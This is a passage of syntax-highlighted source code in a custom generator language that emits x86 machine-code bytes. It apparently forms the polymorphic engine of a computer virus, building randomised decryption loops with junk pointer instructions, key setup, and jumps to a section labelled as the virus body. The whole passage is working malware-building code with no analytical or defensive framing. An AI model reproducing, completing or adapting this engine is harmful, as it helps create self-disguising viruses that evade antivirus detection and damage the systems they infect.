    </span><span class="sc11">$26h</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">

</span><span class="sc2">//emit the first byte
</span><span class="sc0">
    </span><span class="sc11">select</span><span class="sc0">  </span><span class="sc11">SW_CryptType</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">00000000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">  </span><span class="sc10">(</span><span class="sc11">SW_KeySize</span><span class="sc10">&amp;</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//ADD
</span><span class="sc0">        </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">00101000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">  </span><span class="sc10">(</span><span class="sc11">SW_KeySize</span><span class="sc10">&amp;</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//SUB
</span><span class="sc0">        </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">00110000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">  </span><span class="sc10">(</span><span class="sc11">SW_KeySize</span><span class="sc10">&amp;</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//XOR
</span><span class="sc0">    </span><span class="sc10">};</span><span class="sc0">


</span><span class="sc2">// set up the second byte   
</span><span class="sc0">
    </span><span class="sc2">// set the displacement bit
</span><span class="sc0">    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_UseDisplacement</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">CryptSecondByte</span><span class="sc10">=</span><span class="sc4">00000000b</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">CryptSecondByte</span><span class="sc10">=</span><span class="sc4">10000000b</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">


    </span><span class="sc2">//set the base, index
</span><span class="sc0">    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_PointerMode</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">CryptSecondByte</span><span class="sc10">=</span><span class="sc11">CryptSecondByte</span><span class="sc10">|</span><span class="sc4">00000100b</span><span class="sc10">|(</span><span class="sc11">SW_IndexReg</span><span class="sc10">&amp;</span><span class="sc4">1b</span><span class="sc10">);</span><span class="sc0">   
        </span><span class="sc11">CryptSecondByte</span><span class="sc10">=</span><span class="sc11">CryptSecondByte</span><span class="sc10">|</span><span class="sc4">00000110b</span><span class="sc10">|((</span><span class="sc11">SW_BaseReg</span><span class="sc10">&amp;</span><span class="sc4">1b</span><span class="sc10">)^</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">   
        </span><span class="sc11">CryptSecondByte</span><span class="sc10">=</span><span class="sc11">CryptSecondByte</span><span class="sc10">|(</span><span class="sc11">SW_IndexReg</span><span class="sc10">&amp;</span><span class="sc4">1b</span><span class="sc10">)|(</span><span class="sc11">SW_BaseReg</span><span class="sc10">&amp;</span><span class="sc4">1b</span><span class="sc10">)&lt;</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">    
        </span><span class="sc11">CryptSecondByte</span><span class="sc10">=</span><span class="sc11">CryptSecondByte</span><span class="sc10">|</span><span class="sc4">00000110b</span><span class="sc10">|((</span><span class="sc11">SW_BaseReg</span><span class="sc10">&amp;</span><span class="sc4">1b</span><span class="sc10">)^</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">   
    </span><span class="sc10">};</span><span class="sc0">


    </span><span class="sc2">// If bp is in use but not a displacement, then make voodoo on Intel's people,  
</span><span class="sc0">    </span><span class="sc2">// and then try to work around 
</span><span class="sc0">
    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_UseDisplacement</span><span class="sc0">   </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_PointerMode</span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_BaseReg</span><span class="sc10">{</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">CryptSecondByte</span><span class="sc10">=</span><span class="sc4">01000110b</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc10">};</span><span class="sc0">
        </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_BaseReg</span><span class="sc10">{</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">CryptSecondByte</span><span class="sc10">=</span><span class="sc4">01000110b</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
        </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">

    </span><span class="sc2">//set the key reg
</span><span class="sc0">    </span><span class="sc11">SW_KeyReg</span><span class="sc10">=</span><span class="sc11">SW_KeyReg</span><span class="sc10">&amp;</span><span class="sc4">00000111b</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">CryptSecondByte</span><span class="sc10">=</span><span class="sc11">CryptSecondByte</span><span class="sc10">|(</span><span class="sc0"> </span><span class="sc11">SW_KeyReg</span><span class="sc10">&lt;</span><span class="sc4">3</span><span class="sc10">);</span><span class="sc0"> 

    </span><span class="sc11">$CryptSecondByte</span><span class="sc10">;</span><span class="sc0">


    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_UseDisplacement</span><span class="sc0"> 
    </span><span class="sc10">{</span><span class="sc0">    
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_PointerMode</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_BaseReg</span><span class="sc10">{</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">$0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
            </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_BaseReg</span><span class="sc10">{</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">$0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
        </span><span class="sc10">};</span><span class="sc0">
        </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">$Displacement</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">Displacement</span><span class="sc10">&gt;</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">    
    </span><span class="sc10">};</span><span class="sc0">
    
</span><span class="sc10">};</span><span class="sc0">











</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">loop1</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">$81h</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0F8h</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">IncreaseRegister</span><span class="sc10">&amp;</span><span class="sc4">00000111b</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">$offset</span><span class="sc0"> </span><span class="sc11">PointerCheckValue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">$75h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$deltab</span><span class="sc0"> </span><span class="sc11">LB_DecryptLoop</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">loop2</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">$81h</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0F8h</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IncreaseRegister</span><span class="sc10">&amp;</span><span class="sc4">00000111b</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">$offset</span><span class="sc0"> </span><span class="sc11">PointerCheckValue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">$74h</span><span class="sc10">;</span><span class="sc11">$2</span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc11">$0EBh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$deltab</span><span class="sc0"> </span><span class="sc11">LB_DecryptLoop</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">Loop</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">randvar</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">loop1</span><span class="sc10">;</span><span class="sc0">  
        </span><span class="sc11">loop2</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">  
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc0">




</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">SillyShift</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">function</span><span class="sc0">    </span><span class="sc11">AddPointer</span><span class="sc0">   </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">SillyShift</span><span class="sc10">=</span><span class="sc11">randvar</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">SillyPointerShiftA</span><span class="sc10">=</span><span class="sc11">SillyPointerShiftA</span><span class="sc10">+</span><span class="sc11">SillyShift</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">$81h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">0C0h</span><span class="sc10">|</span><span class="sc11">IncreaseRegister</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">SillyShift</span><span class="sc10">;</span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">SillyShift</span><span class="sc10">&gt;</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc11">function</span><span class="sc0">    </span><span class="sc11">AddPointer2</span><span class="sc0">   </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">SillyShift</span><span class="sc10">=</span><span class="sc11">randvar</span><span class="sc10">&amp;</span><span class="sc4">1111b</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">SillyPointerShiftA</span><span class="sc10">=</span><span class="sc11">SillyPointerShiftA</span><span class="sc10">+</span><span class="sc11">SillyShift</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">$83h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">0C0h</span><span class="sc10">|</span><span class="sc11">IncreaseRegister</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">SillyShift</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc11">function</span><span class="sc0">    </span><span class="sc11">SubPointer</span><span class="sc0">   </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">SillyShift</span><span class="sc10">=</span><span class="sc11">randvar</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">SillyPointerShiftA</span><span class="sc10">=</span><span class="sc11">SillyPointerShiftA</span><span class="sc10">-</span><span class="sc11">SillyShift</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">$81h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">0E8h</span><span class="sc10">|</span><span class="sc11">IncreaseRegister</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">SillyShift</span><span class="sc10">;</span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">SillyShift</span><span class="sc10">&gt;</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc11">function</span><span class="sc0">    </span><span class="sc11">SubPointer2</span><span class="sc0">   </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">SillyShift</span><span class="sc10">=</span><span class="sc11">randvar</span><span class="sc10">&amp;</span><span class="sc4">1111b</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">SillyPointerShiftA</span><span class="sc10">=</span><span class="sc11">SillyPointerShiftA</span><span class="sc10">-</span><span class="sc11">SillyShift</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">$83h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">0E8h</span><span class="sc10">|</span><span class="sc11">IncreaseRegister</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">SillyShift</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc11">function</span><span class="sc0">    </span><span class="sc11">LeaPointer</span><span class="sc0">   </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">SillyShift</span><span class="sc10">=</span><span class="sc11">randvar</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">SillyPointerShiftA</span><span class="sc10">=</span><span class="sc11">SillyPointerShiftA</span><span class="sc10">+</span><span class="sc11">SillyShift</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">$8Dh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">IncreaseRegister</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$9Fh</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">$AEh</span><span class="sc10">;</span><span class="sc11">$B4h</span><span class="sc10">;</span><span class="sc11">$BDh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">SillyShift</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">SillyShift</span><span class="sc10">&gt;</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc11">function</span><span class="sc0">    </span><span class="sc11">LeaPointer2</span><span class="sc0">   </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">SillyShift</span><span class="sc10">=</span><span class="sc11">randvar</span><span class="sc10">&amp;</span><span class="sc4">1111b</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">SillyPointerShiftA</span><span class="sc10">=</span><span class="sc11">SillyPointerShiftA</span><span class="sc10">+</span><span class="sc11">SillyShift</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">$8Dh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">IncreaseRegister</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$5Fh</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">$6Eh</span><span class="sc10">;</span><span class="sc11">$74h</span><span class="sc10">;</span><span class="sc11">$7Dh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">SillyShift</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc11">function</span><span class="sc0">    </span><span class="sc11">IncPointer</span><span class="sc0">   </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">SillyPointerShiftA</span><span class="sc10">=</span><span class="sc11">SillyPointerShiftA</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IncreaseRegister</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc4">40h</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc11">function</span><span class="sc0">    </span><span class="sc11">DecPointer</span><span class="sc0">   </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">SillyPointerShiftA</span><span class="sc10">=</span><span class="sc11">SillyPointerShiftA</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IncreaseRegister</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc4">48h</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc11">function</span><span class="sc0">    </span><span class="sc11">NotNegPointer</span><span class="sc0">   </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">SillyPointerShiftA</span><span class="sc10">=</span><span class="sc11">SillyPointerShiftA</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">$0F7h</span><span class="sc10">;</span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">IncreaseRegister</span><span class="sc10">|</span><span class="sc4">0D0h</span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc11">$0F7h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">IncreaseRegister</span><span class="sc10">|</span><span class="sc4">0D8h</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc11">function</span><span class="sc0">    </span><span class="sc11">NegNotPointer</span><span class="sc0">   </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">SillyPointerShiftA</span><span class="sc10">=</span><span class="sc11">SillyPointerShiftA</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">$0F7h</span><span class="sc10">;</span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">IncreaseRegister</span><span class="sc10">|</span><span class="sc4">0D8h</span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc11">$0F7h</span><span class="sc10">;</span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">IncreaseRegister</span><span class="sc10">|</span><span class="sc4">0D0h</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc10">};</span><span class="sc0">


</span><span class="sc11">function</span><span class="sc0">    </span><span class="sc11">ManipulatePointer</span><span class="sc0">  </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">randvar</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">IncPointer</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DecPointer</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">NotNegPointer</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">NegNotPointer</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">AddPointer</span><span class="sc10">;</span><span class="sc0">     
    </span><span class="sc11">AddPointer2</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">SubPointer</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">SubPointer2</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">LeaPointer2</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc0">


</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">FixPointer</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">$81h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">0C0h</span><span class="sc10">|</span><span class="sc11">IncreaseRegister</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$offset</span><span class="sc0"> </span><span class="sc11">PointerFixValue</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">




</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">DecryptorSecondPart</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_Sectionsdone</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">$0E9h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$deltaw</span><span class="sc0"> </span><span class="sc11">OFS_FirstPart</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0"> </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc10">};</span><span class="sc0">

    </span><span class="sc19">label</span><span class="sc0"> </span><span class="sc11">LB_DecryptLoop</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">random</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">shift</span><span class="sc0">   </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc11">CryptInstruction</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">SillyPointerShiftB</span><span class="sc10">=</span><span class="sc11">SillyPointerShiftA</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">SillyPointerShiftA</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
            </span><span class="sc11">FixPointer</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">};</span><span class="sc0">
        </span><span class="sc11">ManipulatePointer</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">ManipulatePointer</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">ManipulatePointer</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">  
    </span><span class="sc11">Loop</span><span class="sc10">;</span><span class="sc0">


    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_Sectionsdone</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> 
        </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">//000/001
</span><span class="sc0">        </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">//010/011
</span><span class="sc0">        </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">$0E9h</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc11">$deltaw</span><span class="sc0"> </span><span class="sc11">OFS_VirusBody</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc11">all</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">$0E9h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$deltaw</span><span class="sc0"> </span><span class="sc11">OFS_VirusBody</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">   </span><span class="sc2">//100/101
</span><span class="sc0">        </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">//110/111
</span><span class="sc0">         </span><span class="sc10">};</span><span class="sc0">


    </span><span class="sc11">SW_Sectionsdone</span><span class="sc10">=</span><span class="sc11">SW_Sectionsdone</span><span class="sc10">|</span><span class="sc4">010</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc10">};</span><span class="sc0">


















</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">MovRegKey</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">SW_KeyReg</span><span class="sc10">=</span><span class="sc11">SW_KeyReg</span><span class="sc10">&amp;</span><span class="sc4">00000111b</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">10110000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">SW_KeyReg</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">10111000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">SW_KeyReg</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">  

    </span><span class="sc11">$key</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">key</span><span class="sc10">&gt;</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">














</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">CleanRegKey</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">// Emit the first byte. XOR or SUB   
</span><span class="sc0">    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">randvar</span><span class="sc0"> 
    </span><span class="sc10">{</span><span class="sc0"> 
    </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">00110000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc10">&amp;</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> 
    </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">00101000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc10">&amp;</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">  
    </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc2">//emit the second byte.  KeyReg,KeyReg
</span><span class="sc0">    </span><span class="sc11">SW_KeyReg</span><span class="sc10">=</span><span class="sc11">SW_KeyReg</span><span class="sc10">&amp;</span><span class="sc4">00000111b</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">$</span><span class="sc10">=(</span><span class="sc0"> </span><span class="sc11">SW_KeyReg</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">SW_KeyReg</span><span class="sc10">&lt;</span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc4">11000000b</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">


</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">SetRegKey</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
